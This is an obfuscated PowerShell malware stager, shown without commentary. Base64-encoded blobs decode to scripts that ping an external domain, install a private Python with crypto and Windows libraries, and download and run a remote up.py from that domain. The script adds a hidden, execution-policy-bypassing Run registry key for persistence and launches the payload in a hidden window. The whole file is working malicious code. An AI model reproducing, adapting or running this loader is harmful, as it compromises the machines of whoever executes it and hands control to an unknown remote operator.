$sv = 'Err'+'orAction'+'Preference'
Set-Variable -Name $sv -Value 'Stop'

$TFlsgCfG = 'eyJwYXRocyI6WyJydW5tZS5wczEiXSwiZGF0YSI6WyJKR1p6UkhKcGRtVnpJRDBnUjJWMExWQlRSSEpwZG1VZ0xWQlRVSEp2ZG1sa1pYSWdSbWxzWlZONWMzUmxiU0I4SUZObGJHVmpkQzFQWW1wbFkzUWdMVVY0Y0dGdVpGQnliM0JsY25SNUlGSnZiM1FOQ2lSdFlXbHVSSEpwZG1VZ1BTQWtabk5FY21sMlpYTWdmQ0JYYUdWeVpTMVBZbXBsWTNRZ2V5QWtYeUF0YldGMFkyZ2dJbDViUVMxYVhUcGNYQ1FpSUgwZ2ZDQlRaV3hsWTNRdFQySnFaV04wSUMxR2FYSnpkQ0F4RFFwcFppQW9MVzV2ZENBa2JXRnBia1J5YVhabEtTQjdJR1Y0YVhRZ2ZRMEtEUW9rZDI5eWEybHVaMFJwY2lBOUlDSWtiV0ZwYmtSeWFYWmxYRlJsYlhBaURRcHBaaUFvTFc1dmRDQW9WR1Z6ZEMxUVlYUm9JQ1IzYjNKcmFXNW5SR2x5S1NrZ2V5Qk9aWGN0U1hSbGJTQXRVR0YwYUNBa2QyOXlhMmx1WjBScGNpQXRTWFJsYlZSNWNHVWdSR2x5WldOMGIzSjVJSHdnVDNWMExVNTFiR3dnZlEwS0RRb2tiWFYwWlhoR2FXeGxJRDBnSWlSM2IzSnJhVzVuUkdseVhITmpjbWx3ZEM1c2IyTnJJZzBLYVdZZ0tGUmxjM1F0VUdGMGFDQWtiWFYwWlhoR2FXeGxLU0I3SUdWNGFYUWdmUTBLVG1WM0xVbDBaVzBnTFZCaGRHZ2dKRzExZEdWNFJtbHNaU0F0U1hSbGJWUjVjR1VnUm1sc1pTQXRSbTl5WTJVZ2ZDQlBkWFF0VG5Wc2JBMEtEUXBKYm5admEyVXRWMlZpVW1WeGRXVnpkQ0F0VlhKcElDSm9kSFJ3Y3pvdkwyUm1hWGR2WkM1amIyMHZNaTV3YUhBaUlDMVZjMlZDWVhOcFkxQmhjbk5wYm1jZ2ZDQlBkWFF0VG5Wc2JBMEtEUW9rY0hsMGFHOXVVR0YwYUNBOUlDSWtkMjl5YTJsdVowUnBjbHhRZVVWdWRpSU5DaVJ6WTNKcGNIUlFZWFJvSUQwZ0lpUjNiM0pyYVc1blJHbHlYSFZ3TG5CNUlnMEtKSEI1V21sd0lEMGdJaVJsYm5ZNlZFVk5VRnh3ZVY5bGJXSmxaR1JsWkM1NmFYQWlEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZkM2QzTG5CNWRHaHZiaTV2Y21jdlpuUndMM0I1ZEdodmJpOHpMakV4TGpndmNIbDBhRzl1TFRNdU1URXVPQzFsYldKbFpDMWhiV1EyTkM1NmFYQWlJQzFQZFhSR2FXeGxJQ1J3ZVZwcGNBMEtSWGh3WVc1a0xVRnlZMmhwZG1VZ0xWQmhkR2dnSkhCNVdtbHdJQzFFWlhOMGFXNWhkR2x2YmxCaGRHZ2dKSEI1ZEdodmJsQmhkR2dnTFVadmNtTmxEUXBTWlcxdmRtVXRTWFJsYlNBa2NIbGFhWEFOQ2cwS0pIQkpibWwwUm1sc1pTQTlJRXB2YVc0dFVHRjBhQ0FrY0hsMGFHOXVVR0YwYUNBaWNIbDBhRzl1TXpFeExsOXdkR2dpRFFvb1IyVjBMVU52Ym5SbGJuUWdKSEJKYm1sMFJtbHNaU2tnTFhKbGNHeGhZMlVnSnlOcGJYQnZjblFnYzJsMFpTY3NJQ2RwYlhCdmNuUWdjMmwwWlNjZ2ZDQlRaWFF0UTI5dWRHVnVkQ0FrY0VsdWFYUkdhV3hsRFFvTkNrbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDMVZjbWtnSW1oMGRIQnpPaTh2WW05dmRITjBjbUZ3TG5CNWNHRXVhVzh2WjJWMExYQnBjQzV3ZVNJZ0xVOTFkRVpwYkdVZ0lpUndlWFJvYjI1UVlYUm9YR2RsZEMxd2FYQXVjSGtpRFFvbUlDSWtjSGwwYUc5dVVHRjBhRnh3ZVhSb2IyNHVaWGhsSWlBaUpIQjVkR2h2YmxCaGRHaGNaMlYwTFhCcGNDNXdlU0lOQ2xKbGJXOTJaUzFKZEdWdElDSWtjSGwwYUc5dVVHRjBhRnhuWlhRdGNHbHdMbkI1SWcwS0RRb21JQ0lrY0hsMGFHOXVVR0YwYUZ4d2VYUm9iMjR1WlhobElpQXRiU0J3YVhBZ2FXNXpkR0ZzYkNCd2VXTnllWEIwYjJSdmJXVWdjSGx3YVhkcGJqTXlJSEpsY1hWbGMzUnpEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZaR1pwZDI5a0xtTnZiUzkxY0M1d2VTSWdMVTkxZEVacGJHVWdKSE5qY21sd2RGQmhkR2dOQ2lZZ0lpUndlWFJvYjI1UVlYUm9YSEI1ZEdodmJpNWxlR1VpSUNJa2MyTnlhWEIwVUdGMGFDSU5DZz09Il19'
$runAgainContent = 'JGZzRHJpdmVzID0gR2V0LVBTRHJpdmUgLVBTUHJvdmlkZXIgRmlsZVN5c3RlbSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFJvb3QNCiRtYWluRHJpdmUgPSAkZnNEcml2ZXMgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggIl5bQS1aXTpcXCQiIH0gfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQppZiAoLW5vdCAkbWFpbkRyaXZlKSB7IGV4aXQgfQ0KDQokd29ya2luZ0RpciA9ICIkbWFpbkRyaXZlXFRlbXAiDQppZiAoLW5vdCAoVGVzdC1QYXRoICR3b3JraW5nRGlyKSkgeyBOZXctSXRlbSAtUGF0aCAkd29ya2luZ0RpciAtSXRlbVR5cGUgRGlyZWN0b3J5IHwgT3V0LU51bGwgfQ0KDQokZmluaXNoTG9jayA9IEpvaW4tUGF0aCAkd29ya2luZ0RpciAiZmluaXNoLmxvY2siDQppZiAoLW5vdCAoVGVzdC1QYXRoICRmaW5pc2hMb2NrKSkgew0KICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHdvcmtpbmdEaXIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgUmVtb3ZlLUl0ZW0gLUZvcmNlIC1SZWN1cnNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQp9DQoNCg0KSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9kZml3b2QuY29tLzIucGhwIiAtVXNlQmFzaWNQYXJzaW5nIHwgT3V0LU51bGwNCg0KJHB5dGhvblBhdGggPSBKb2luLVBhdGggJHdvcmtpbmdEaXIgIlB5RW52Ig0KJHNjcmlwdFBhdGggPSBKb2luLVBhdGggJHdvcmtpbmdEaXIgInVwLnB5Ig0KJHB5WmlwID0gSm9pbi1QYXRoICRlbnY6VEVNUCAicHlfZW1iZWRkZWQuemlwIg0KDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwczovL3d3dy5weXRob24ub3JnL2Z0cC9weXRob24vMy4xMS44L3B5dGhvbi0zLjExLjgtZW1iZWQtYW1kNjQuemlwIiAtT3V0RmlsZSAkcHlaaXANCkV4cGFuZC1BcmNoaXZlIC1QYXRoICRweVppcCAtRGVzdGluYXRpb25QYXRoICRweXRob25QYXRoIC1Gb3JjZQ0KUmVtb3ZlLUl0ZW0gJHB5WmlwIC1Gb3JjZQ0KDQokcEluaXRGaWxlID0gSm9pbi1QYXRoICRweXRob25QYXRoICJweXRob24zMTEuX3B0aCINCihHZXQtQ29udGVudCAkcEluaXRGaWxlKSAtcmVwbGFjZSAnI2ltcG9ydCBzaXRlJywgJ2ltcG9ydCBzaXRlJyB8IFNldC1Db250ZW50ICRwSW5pdEZpbGUNCg0KSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9ib290c3RyYXAucHlwYS5pby9nZXQtcGlwLnB5IiAtT3V0RmlsZSAoSm9pbi1QYXRoICRweXRob25QYXRoICJnZXQtcGlwLnB5IikNCiYgKEpvaW4tUGF0aCAkcHl0aG9uUGF0aCAicHl0aG9uLmV4ZSIpIChKb2luLVBhdGggJHB5dGhvblBhdGggImdldC1waXAucHkiKQ0KUmVtb3ZlLUl0ZW0gKEpvaW4tUGF0aCAkcHl0aG9uUGF0aCAiZ2V0LXBpcC5weSIpIC1Gb3JjZQ0KDQomIChKb2luLVBhdGggJHB5dGhvblBhdGggInB5dGhvbi5leGUiKSAtbSBwaXAgaW5zdGFsbCBweWNyeXB0b2RvbWUgcHlwaXdpbjMyIHJlcXVlc3RzDQoNCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vZGZpd29kLmNvbS91cC5weSIgLU91dEZpbGUgJHNjcmlwdFBhdGgNCiYgKEpvaW4tUGF0aCAkcHl0aG9uUGF0aCAicHl0aG9uLmV4ZSIpICRzY3JpcHRQYXRoDQo='

$json = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TFlsgCfG))
$obj = ConvertFrom-Json $json
$paths = $obj.paths
$data = $obj.data

$up = Join-Path $Env:AppData 'Y4TFCR'
[System.IO.Directory]::CreateDirectory($up) | Out-Null

for ($i = 0; $i -lt $paths.Count; $i++) {
    $filename = $paths[$i]
    $bytes = [System.Convert]::FromBase64String($data[$i])
    $fullPath = Join-Path $up $filename
    $dir = [System.IO.Path]::GetDirectoryName($fullPath)
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir | Out-Null }
    [System.IO.File]::WriteAllBytes($fullPath, $bytes)
}

$runAgainPath = Join-Path $up 'runagain.ps1'
$runAgainBytes = [System.Convert]::FromBase64String($runAgainContent)
[System.IO.File]::WriteAllBytes($runAgainPath, $runAgainBytes)

$cmd = "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$runAgainPath`""
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyPower" -Value $cmd -PropertyType String -Force | Out-Null

$scriptPath = Join-Path $up 'runme.ps1'
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden -WorkingDirectory $up
